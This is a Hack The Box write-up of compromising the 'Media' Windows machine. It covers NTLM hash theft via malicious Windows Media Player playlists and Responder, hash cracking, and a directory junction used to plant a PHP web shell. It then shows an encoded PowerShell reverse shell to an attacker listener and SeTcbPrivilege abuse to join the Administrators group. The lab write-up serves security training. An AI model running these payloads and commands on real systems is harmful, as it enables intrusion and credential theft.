---
title: "Hack The Box: Media"
date: 2025-11-08
summary: "A Medium Windows-based machine where the target is compromised by uploading a malicious Windows Media Player playlist file to steal an NTLMv2 hash, granting SSH access upon cracking. Lateral movement to the web server service account is achieved by creating a directory junction that maps the upload folder to the web root and deploying a PHP web shell. Privilege escalation to full administrative access is executed by exploiting SeTcbPrivilege to add the initial user to the local Administrators group."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Medium"
link: "https://app.hackthebox.com/machines/Media"
tags:
  - file-upload-attacks
  - john
  - nmap
  - ntlm-stealing
  - ntlm-theft
  - responder
  - reverse-shell
  - setcbprivilege
  - symlinks
  - tcbelevation
  - web
  - web-shell
  - winpeas
---

### Nmap Scan

```bash
$ nmap -sCV -vv -oA nmap/media-top-tcp 10.129.234.67
Nmap scan report for 10.129.234.67
Host is up, received echo-reply ttl 127 (0.21s latency).
Scanned at 2025-11-05 09:27:39 +04 for 32s
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
22/tcp   open  ssh           syn-ack ttl 127 OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-title: ProMotion Studio
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: MEDIA
|   NetBIOS_Domain_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-05T05:28:03+00:00
|_ssl-date: 2025-11-05T05:28:09+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=MEDIA
| Issuer: commonName=MEDIA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-04T05:22:16
| Not valid after:  2026-05-06T05:22:16
| MD5:   1140:23b4:5a68:eca4:b016:0e43:059f:e7c3
| SHA-1: 7ff7:43c2:efb5:5e07:02c3:de7f:205d:b5ce:94a5:aabd
<SNIP>
```

As seen from the scan, SSH, HTTP, and RDP are live.

### Enumerating HTTP

Let’s start enumerating HTTP by visiting the website on firefox:

![Figure 1](/assets/images/writeups/hack-the-box-media/hack-the-box-media-fig-2.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

It seems to be a services website.

Nothing about it seems too interesting as most links redirect to nowhere.

However…

### Abusing File Uploads

There is a file upload input at the bottom, which suggests potential file upload vulnerabilities:

![Figure 2](/assets/images/writeups/hack-the-box-media/hack-the-box-media-fig-3.png)

<figcaption class="blog-image-caption">Figure 2</figcaption>

There is an interesting note written above the input form, which instructs the user to upload files that are compatible with Windows Media Player.

This suggests that someone will open our file using media player.

Let’s first see what files are compatible with Windows Media Player, by visiting [this article](https://support.microsoft.com/en-us/topic/file-types-supported-by-windows-media-player-32d9998e-dc8f-af54-7ba1-e996f74375d9) by Microsoft:

![Figure 3](/assets/images/writeups/hack-the-box-media/hack-the-box-media-fig-4.png)

<figcaption class="blog-image-caption">Figure 3</figcaption>

Keep an eye on the underlined extensions, as we will need them in upcoming steps.

Let’s verify our hypothesis (someone will open our file) by uploading a dummy file with dummy data:

```bash
$ echo "test" > test.asx
```

Now let’s upload the file to the form and interpret the response:

![Figure 4](/assets/images/writeups/hack-the-box-media/hack-the-box-media-fig-5.png)

<figcaption class="blog-image-caption">Figure 4</figcaption>

![Figure 5](/assets/images/writeups/hack-the-box-media/hack-the-box-media-fig-6.png)

<figcaption class="blog-image-caption">Figure 5</figcaption>

Notice how the hypothesis is likely correct: someone will open the file that we will send.

### Capturing a User’s Hash

Given this fact and the fact that this is a Windows machine, can we upload a file that will trick the user opening it to send us his NTLM hash?

By researching online for ways to force the user opening our file to send us his NTLM hash, we will come across [this GitHub repository](https://github.com/Greenwolf/ntlm_theft), which does the following:

> ntlm_theft is an Open Source Python3 Tool that generates 21 different types of hash theft documents. These can be used for phishing when either the target allows smb traffic outside their network, or if you are already inside the internal network.
> 

This is exactly what we want.

Among the 21 different types of documents that will be generated, we can find ones that are compatible with the media player, which are `.asx`, `.wax`, and `.m3u`.

Let’s create the files and make them redirect to our IP address:

```bash
$ python3 ntlm_theft.py -g all -s 10.10.14.191 -f benign     
<SNIP>
Created: benign/benign.scf (BROWSE TO FOLDER)
Created: benign/benign-(url).url (BROWSE TO FOLDER)
Created: benign/benign-(icon).url (BROWSE TO FOLDER)
Created: benign/benign.lnk (BROWSE TO FOLDER)
Created: benign/benign.rtf (OPEN)
Created: benign/benign-(stylesheet).xml (OPEN)
Created: benign/benign-(fulldocx).xml (OPEN)
Created: benign/benign.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: benign/benign-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: benign/benign-(includepicture).docx (OPEN)
Created: benign/benign-(remotetemplate).docx (OPEN)
Created: benign/benign-(frameset).docx (OPEN)
Created: benign/benign-(externalcell).xlsx (OPEN)
Created: benign/benign.wax (OPEN)
Created: benign/benign.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: benign/benign.asx (OPEN)
Created: benign/benign.jnlp (OPEN)
Created: benign/benign.application (DOWNLOAD AND OPEN)
Created: benign/benign.pdf (OPEN AND ALLOW)
Created: benign/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: benign/benign.library-ms (BROWSE TO FOLDER)
Created: benign/Autorun.inf (BROWSE TO FOLDER)
Created: benign/desktop.ini (BROWSE TO FOLDER)
Created: benign/benign.theme (THEME TO INSTALL
Generation Complete.
```

Before including them in the form, let’s start `responder` to capture any hashes that might be forwarded to us:

```bash
$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
                   
<SNIP>
[+] Listening for events...
```

Now let’s include the files in the form (which should be uploaded one by one). I’ll add dummy data to the first name, last name, and email address input fields:

![Figure 6](/assets/images/writeups/hack-the-box-media/hack-the-box-media-fig-7.png)

<figcaption class="blog-image-caption">Figure 6</figcaption>

Few seconds after sending our data, and before sending any other files, we can see that `responder` captured an NTLMv2 hash for the user Enox:

```bash
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.234.67
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:d4913de6fd4d67b2:9C976F<REDACTED>
```

Success! The trick worked.

Now let’s attempt cracking the hash with `john`:

```bash
$ echo 'enox::MEDIA:d4913de6fd4d67b2:9C976F<REDACTED>' > enox.hash

$ john enox.hash -w=/usr/share/wordlists/rockyou.txt
<SNIP>
1234<REDACTED>       (enox)     
<SNIP>
Session completed.
```

And the hash was successfully cracked.

### RCE as Enox

Let’s try to log in to SSH with the found credentials:

```bash
$ ssh enox@10.129.234.67
enox@10.129.234.67's password:

Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

enox@MEDIA C:\Users\enox>
```

Success! We got a shell over the target.

Let’s navigate to `Desktop` where `user.txt` will be waiting for us:

```bash
enox@MEDIA C:\Users\enox>cd Desktop

enox@MEDIA C:\Users\enox\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of C:\Users\enox\Desktop

10/02/2023  10:04 AM    <DIR>          .
10/02/2023  09:26 AM    <DIR>          ..
11/06/2025  10:11 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   9,815,498,752 bytes free

enox@MEDIA C:\Users\enox\Desktop>type user.txt
ba12de<REDACTED>
```

### Lateral Movement

By uploading `winpeas.exe` to the target through a Python HTTP server, we will quickly realize that the user Enox doesn’t provide a clear path for privilege escalation. We get permission errors for many enumeration commands.

Let’s try to move laterally into the account running the HTTP server, by uploading a web shell.

As seen in the `nmap` output above, the HTTP server runs Apache and uses PHP, so a PHP shell sounds a good idea to gain RCE as the Apache server user.

Before trying to upload a web shell, let’s first understand the server configurations by reading the `C:\xampp\htdocs\index.php` file:

```bash
enox@MEDIA C:\Users\enox\Desktop> powershell
<SNIP>
PS C:\Users\enox\Desktop> cd C:\xampp\htdocs
PS C:\xampp\htdocs> cat index.php
<?php
error_reporting(0);

    // Your PHP code for handling form submission and file upload goes here.
    $uploadDir = 'C:/Windows/Tasks/Uploads/'; // Base upload directory

    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["fileToUpload"])) {
        $firstname = filter_var($_POST["firstname"], FILTER_SANITIZE_STRING);
        $lastname = filter_var($_POST["lastname"], FILTER_SANITIZE_STRING);
        $email = filter_var($_POST["email"], FILTER_SANITIZE_STRING);

        // Create a folder name using the MD5 hash of Firstname + Lastname + Email
        $folderName = md5($firstname . $lastname . $email);

        // Create the full upload directory path
        $targetDir = $uploadDir . $folderName . '/';

        // Ensure the directory exists; create it if not
        if (!file_exists($targetDir)) {
            mkdir($targetDir, 0777, true);
        }

        // Sanitize the filename to remove unsafe characters
        $originalFilename = $_FILES["fileToUpload"]["name"];
        $sanitizedFilename = preg_replace("/[^a-zA-Z0-9._]/", "", $originalFilename);

        // Build the full path to the target file
        $targetFile = $targetDir . $sanitizedFilename;

        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
            echo "<script>alert('Your application was successfully submitted. Our HR shall review your video and get back to you.');</script>";

            // Update the todo.txt file
            $todoFile = $uploadDir . 'todo.txt';
            $todoContent = "Filename: " . $originalFilename . ", Random Variable: " . $folderName . "\n";

            // Append the new line to the file
            file_put_contents($todoFile, $todoContent, FILE_APPEND);
        } else {
            echo "<script>alert('Uh oh, something went wrong... Please submit again');</script>";
        }
    }
    ?>
<!DOCTYPE html>
<SNIP>
```

So the location where our uploaded files will be saved is `C:/Windows/Tasks/Uploads/`, where we can expect to find folders that have MD5 names according to our supplied first name, last name, and email address.

Let’s enumerate `C:/Windows/Tasks/Uploads/` to see what the directory looks like:

```bash
PS C:\xampp\htdocs> cd C:/Windows/Tasks/Uploads/
PS C:\Windows\Tasks\Uploads> tree . /F
Folder PATH listing
Volume serial number is 000001C5 EAD8:5D48
C:\WINDOWS\TASKS\UPLOADS
ª   todo.txt
ª       
+---c3f2c907adddc094050688e39c3549d1
ª       benign.wax
ª       
+---fa3aede8096f0190d4ec823a75377365
        test.asx
```

So these MD5 directories are named after our supplied names and email address values, and they indeed include the uploaded test and malicious media player files.

### RCE as HTTP Server User

Now to gain a web shell as the server’s user, we need to upload our shell file and make sure that it will be stored in the web root (`C:\xampp\htdocs\`), and not in the uploads directory `C:/Windows/Tasks/Uploads/<some md5 hash>/`).

For this, we can create a symlink that points our uploads directory (the MD5-named directory) into the web root directory.

Let’s do that with Powershell. Let’s remove the `c3f2c907adddc094050688e39c3549d1` directory (which came from this data: firstname = first, lastname = last, mail = mail@mail.com) and replace it with a new directory that links to the web root:

```bash
PS C:\Windows\Tasks\Uploads> Remove-Item .\c3f2c907adddc094050688e39c3549d1\ -recurse
PS C:\Windows\Tasks\Uploads> New-Item -ItemType Junction -Path "C:\Windows\Tasks\Uploads\c3f2c907adddc094050688e39c3549d1 " -Target "C:\xampp\htdocs"

    Directory: C:\Windows\Tasks\Uploads

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----l         11/6/2025  11:46 PM                c3f2c907adddc094050688e39c3549d1
```

Now let’s verify that the uploads directory points to the root directory:

```bash
PS C:\Windows\Tasks\Uploads> ls .\c3f2c907adddc094050688e39c3549d1\

    Directory: C:\Windows\Tasks\Uploads\c3f2c907adddc094050688e39c3549d1

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/2/2023  10:27 AM                assets
d-----         10/2/2023  10:27 AM                css
d-----         10/2/2023  10:27 AM                js
-a----        10/10/2023   5:00 AM          20563 index.php
```

It does! The final required thing is to upload a shell to the server through the input found in the website by using the exact same firstname, lastname, and email address values to make sure that the web shell will be saved in the uploads directory that points to the web root.

I will use a basic PHP web shell (`<?php system($_GET['cmd']); ?>`) and upload it to the server through the input field:

![Figure 7](/assets/images/writeups/hack-the-box-media/hack-the-box-media-fig-8.png)

<figcaption class="blog-image-caption">Figure 7</figcaption>

Let’s verify that the shell is located in the web root directory:

```bash
PS C:\windows\tasks\Uploads\c3f2c907adddc094050688e39c3549d1> ls

    Directory: C:\windows\tasks\Uploads\c3f2c907adddc094050688e39c3549d1

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/2/2023  10:27 AM                assets
d-----         10/2/2023  10:27 AM                css
d-----         10/2/2023  10:27 AM                js
-a----        10/10/2023   5:00 AM          20563 index.php
-a----         11/7/2025   6:18 PM           5493 webshell.php
```

It is.

Now let’s execute it via `curl`:

```bash
$ curl http://10.129.234.67/webshell.php?cmd=whoami
nt authority\local service
```

And we successfully got shell as the local service account.

Let’s upgrade it to a reverse shell (e.g. using a Powershell reverse shell from revshells.com):

```bash
$ nc -nvlp 4445
listening on [any] 4445 ...
```

```bash
$ curl http://10.129.234.67/webshell.php?cmd=powershell%20-e%20JABjAGwAaQBl<SNIP>
```

```bash
listening on [any] 4445 ...
connect to [10.10.14.191] from (UNKNOWN) [10.129.234.67] 49527
whoami
nt authority\local service
PS C:\xampp\htdocs>
```

Success!

### Exploiting `SeTcbPrivilege`

By basic enumeration, we can identify that the user has present `SeTcbPrivilege` privilege:

```bash
PS C:\xampp\htdocs> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State   
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled 
SeCreateGlobalPrivilege       Create global objects               Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```

We can use it with [SeTcbPrivilege-Abuse](https://github.com/b4lisong/SeTcbPrivilege-Abuse) to execute commands with higher permissions (e.g. add the user Enox to the Administrators group).

Let’s do exactly that by cloning the repository, uploading the file to the machine, and executing it with our desired command:

```bash
PS C:\xampp\htdocs> iwr http://10.10.14.191:8000/TcbElevation-x64.exe -OutFile TcbElevation-x64.exe
PS C:\xampp\htdocs> ls

    Directory: C:\xampp\htdocs

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         10/2/2023  10:27 AM                assets                                                               
d-----         10/2/2023  10:27 AM                css                                                                  
d-----         10/2/2023  10:27 AM                js                                                                   
-a----        10/10/2023   5:00 AM          20563 index.php                                                            
-a----         11/7/2025   6:18 PM           5493 revshell.php                                                         
-a----         11/7/2025   6:49 PM          12800 TcbElevation-x64.exe                                                 
-a----         11/7/2025   6:28 PM             31 webshell.php                                                         

PS C:\xampp\htdocs> ./TcbElevation-x64.exe upgrade 'net localgroup Administrators enox /add'
Error starting service 1053

PS C:\xampp\htdocs> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
enox
The command completed successfully.
```

### RCE as Administrated Enox

Now Enox is successfully part of the Administrators group, so we just need to SSH as that user and grab the `root.txt` flag:

```bash
$ ssh enox@10.129.234.67
enox@10.129.234.67's password:

Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

enox@MEDIA C:\Users\enox>cd \users\administrator\desktop

enox@MEDIA C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of C:\Users\Administrator\Desktop

10/02/2023  10:04 AM    <DIR>          .
10/01/2023  10:48 PM    <DIR>          ..
11/06/2025  10:11 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   9,825,951,744 bytes free

enox@MEDIA C:\Users\Administrator\Desktop>type root.txt
ea13cd<REDACTED>
```
